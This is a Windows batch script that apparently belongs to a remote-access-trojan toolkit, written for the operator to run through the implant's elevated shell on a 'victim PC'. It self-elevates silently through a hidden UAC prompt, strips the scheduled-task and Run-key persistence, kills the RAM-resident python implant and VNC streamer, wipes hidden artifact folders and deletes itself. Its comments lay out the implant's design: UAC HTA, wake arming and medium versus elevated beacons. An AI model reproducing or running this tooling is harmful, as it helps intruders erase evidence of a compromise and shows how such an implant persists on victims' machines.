@echo off
rem ============================================================
rem  RAT full cleanup - removes every artifact on the victim PC
rem  (updated: also removes the admin/elevated shell chain)
rem
rem  HOW TO RUN - paste ONE LINE into the ELEVATED RAT shell
rem  (the admin beacon, not the medium one):
rem    start "" cmd /c "%USERPROFILE%\rat_cleanup.bat"
rem  The shell session will drop when the implant is killed -
rem  that is expected. Cleanup continues detached (elevated).
rem  Wait ~90s of reconnect silence before declaring it clean.
rem
rem  REQUIREMENT: MUST run from an ELEVATED beacon/admin shell.
rem  A MEDIUM-IL run cannot kill the high-IL python/helper or
rem  delete the HighestAvailable task - the elevated implant
rem  survives (observed: cleanup ran medium, elevated beacon
rem  reconnected afterwards). If started from a medium shell it
rem  makes ONE UAC attempt; if the prompt is declined it only
rem  removes medium-IL artifacts.
rem
rem  Removes:
rem   - persistence: scheduled task "RuntimeUpdateTask" + all Run values
rem     (RuntimeUpdateTask, Runtime, Updater, Helper, *.exe names)
rem   - processes: RAM-resident python (-I -) medium AND elevated,
rem     loader helper.exe/runtime.exe/updater.exe, node.exe streamer,
rem     ffmpeg children, stray mshta.exe (uac.hta)
rem   - admin/elevation chain: admin.log, uac.hta, elev.ok, wake.armed
rem   - files: %USERPROFILE%\.cache (install, nvdesk, nvnode, logs, pids,
rem     under.json, .installed)
rem   - ephemeral: %USERPROFILE%\pyXXXXXXXX runtime dirs
rem   - power scheme changes it made: re-enable console lock, disable RTC wake
rem   - this script itself
rem ============================================================
setlocal EnableExtensions
set "UP=%USERPROFILE%"

rem ---- 0. elevation detection (net session works as admin; fltmc backup) ----
set "ELEV=0"
net session >nul 2>&1 && set "ELEV=1"
fltmc >nul 2>&1 && set "ELEV=1"

rem ---- self-elevate once (medium only): full pass runs elevated ----
if not "%ELEV%"=="0" goto main
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden -Wait" >nul 2>&1
if not errorlevel 1 goto :eof
rem UAC declined/failed - fall through to a medium-IL best-effort pass
:main

rem ---- 1. persistence FIRST (so nothing re-plants mid-cleanup) ----
schtasks /Delete /TN "RuntimeUpdateTask" /F >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeUpdateTask" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Runtime" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Helper" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "runtime.exe" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "updater.exe" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "helper.exe" /f >nul 2>&1

rem belt-and-braces: any task/Run value pointing into .cache or py* dirs
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.Actions | Where-Object { $_.Execute -and ($_.Execute -like ($env:USERPROFILE + '\.cache\*') -or $_.Execute -like ($env:USERPROFILE + '\py????????????????\*')) } } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue; $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; if (Test-Path $rk) { $k=Get-Item $rk; foreach ($p in $k.Property) { $v=(Get-ItemProperty $rk -Name $p).$p; if ($v -like ($env:USERPROFILE + '\.cache\*') -or $v -like ($env:USERPROFILE + '\py????????????????\*')) { Remove-ItemProperty $rk -Name $p -Force -ErrorAction SilentlyContinue } } }"

rem ---- 2. kill processes (medium + elevated, by path AND by name) ----
rem loader/implant/node/ffmpeg living under .cache or py* dirs
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -like ($env:USERPROFILE + '\.cache\*') -or $_.ExecutablePath -like ($env:USERPROFILE + '\py????????????????\*')) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem kill the RAM-resident implant: hidden python reading script from stdin
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'python.exe' -and $_.CommandLine -match '-I\s+-' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem loader exes by name (covers temp copies running outside .cache)
taskkill /F /IM helper.exe /T >nul 2>&1
taskkill /F /IM runtime.exe /T >nul 2>&1
taskkill /F /IM updater.exe /T >nul 2>&1
rem only an ELEVATED run can terminate the high-IL interpreter/streamer;
rem blanket name kills catch copies not living under .cache/py* dirs.
rem NO /T on python: this script itself was started from the implant
rem shell, so it is a descendant of python.exe - a tree kill would
rem terminate the cleanup before the file/powercfg sections run.
if "%ELEV%"=="1" taskkill /F /IM python.exe >nul 2>&1
if "%ELEV%"=="1" taskkill /F /IM pythonw.exe >nul 2>&1
if "%ELEV%"=="1" taskkill /F /IM node.exe >nul 2>&1
if "%ELEV%"=="1" taskkill /F /IM ffmpeg.exe >nul 2>&1

rem stray mshta.exe hosting the UAC HTA
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'mshta.exe' -and ($_.CommandLine -match 'uac\.hta|\.cache') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem give dying processes a moment to release file locks
ping -n 3 127.0.0.1 >nul

rem ---- 3. revert power scheme changes (console lock + RTC wake) ----
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE CONSOLELOCK 1 >nul 2>&1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE CONSOLELOCK 1 >nul 2>&1
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP RTCWAKE 0 >nul 2>&1
powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP RTCWAKE 0 >nul 2>&1
powercfg /SETACTIVE SCHEME_CURRENT >nul 2>&1

rem ---- 4. delete files ----
rem admin/elevation-chain artifacts (also swept by the .cache rd below)
del /f /q "%UP%\.cache\nvdesk\admin.log" >nul 2>&1
del /f /q "%UP%\.cache\nvdesk\uac.hta" >nul 2>&1
del /f /q "%UP%\.cache\nvdesk\elev.ok" >nul 2>&1
del /f /q "%UP%\.cache\wake.armed" >nul 2>&1

rem installed loader + implant + netvnc runtime (nvdesk/nvnode/logs/pids)
attrib -h -s -r "%UP%\.cache\*" /s /d >nul 2>&1
attrib -h -s -r "%UP%\.cache" >nul 2>&1
rd /s /q "%UP%\.cache" >nul 2>&1

rem ephemeral python runtime dirs (pyXXXXXXXX)
for /d %%D in ("%UP%\py????????????????") do (
  attrib -h -s -r "%%D\*" /s /d >nul 2>&1
  attrib -h -s -r "%%D" >nul 2>&1
  rd /s /q "%%D" >nul 2>&1
)

rem ---- 5. self-delete ----
(goto) 2>nul & del /f /q "%~f0"
endlocal
exit /b 0
